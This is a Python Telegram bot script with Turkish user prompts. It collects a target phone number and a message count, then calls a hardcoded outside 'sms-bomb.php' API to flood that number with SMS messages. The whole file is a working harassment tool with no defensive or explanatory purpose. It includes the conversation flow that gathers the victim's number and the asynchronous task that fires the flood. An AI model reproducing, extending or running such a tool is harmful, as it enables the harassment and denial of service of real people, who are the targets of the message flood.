import os
import logging
import asyncio
import httpx

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

TOKEN = os.getenv("BOT_TOKEN")
API_URL = "https://cvron.alwaysdata.net/cvronapi/sms-bomb.php"

logging.basicConfig(level=logging.INFO)

PHONE, COUNT, CONFIRM = range(3)


# /sms başlat
async def sms(update: Update, context: ContextTypes.DEFAULT_TYPE):

    context.user_data.clear()

    await update.message.reply_text(
        "Telefon numarası gir:\n5xxxxxxxxx"
    )

    return PHONE


# telefon al
async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):

    phone = update.message.text.strip()

    if not phone.isdigit():

        await update.message.reply_text("Geçersiz numara:")
        return PHONE

    context.user_data["phone"] = phone

    await update.message.reply_text("SMS adedi gir:")

    return COUNT


# adet al
async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE):

    try:

        count = int(update.message.text)

        context.user_data["count"] = count

        keyboard = [
            [InlineKeyboardButton("Onayla", callback_data="ok")],
            [InlineKeyboardButton("İptal", callback_data="cancel")]
        ]

        await update.message.reply_text(
            f"Telefon: {context.user_data['phone']}\n"
            f"Adet: {count}",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

        return CONFIRM

    except:

        await update.message.reply_text("Geçersiz sayı:")
        return COUNT


# SMS gönder ve sonucu göster
async def sms_task(query, phone, count):

    try:

        url = f"{API_URL}?phone={phone}&count={count}"

        async with httpx.AsyncClient(timeout=60) as client:

            response = await client.get(url)

            logging.info(f"API cevap: {response.status_code}")
            logging.info(response.text)

            if response.status_code == 200:

                await query.edit_message_text(
                    f"SMS gönderildi.\n\n"
                    f"API cevap:\n{response.text[:200]}"
                )

            else:

                await query.edit_message_text(
                    f"API hata verdi.\n"
                    f"Kod: {response.status_code}"
                )

    except Exception as e:

        logging.error(str(e))

        await query.edit_message_text(
            f"Bağlantı hatası:\n{str(e)}"
        )


# callback handler
async def confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):

    query = update.callback_query

    await query.answer()

    if query.data == "cancel":

        await query.edit_message_text("İptal edildi.")

        return ConversationHandler.END


    phone = context.user_data["phone"]
    count = context.user_data["count"]

    await query.edit_message_text("SMS gönderiliyor...")

    asyncio.create_task(
        sms_task(query, phone, count)
    )

    return ConversationHandler.END


# iptal
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):

    await update.message.reply_text("İptal edildi.")

    return ConversationHandler.END


def main():

    app = Application.builder().token(TOKEN).build()

    conv = ConversationHandler(

        entry_points=[CommandHandler("sms", sms)],

        states={

            PHONE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)
            ],

            COUNT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_count)
            ],

            CONFIRM: [
                CallbackQueryHandler(confirm)
            ],
        },

        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv)

    print("Bot aktif")

    app.run_polling()


if __name__ == "__main__":
    main()
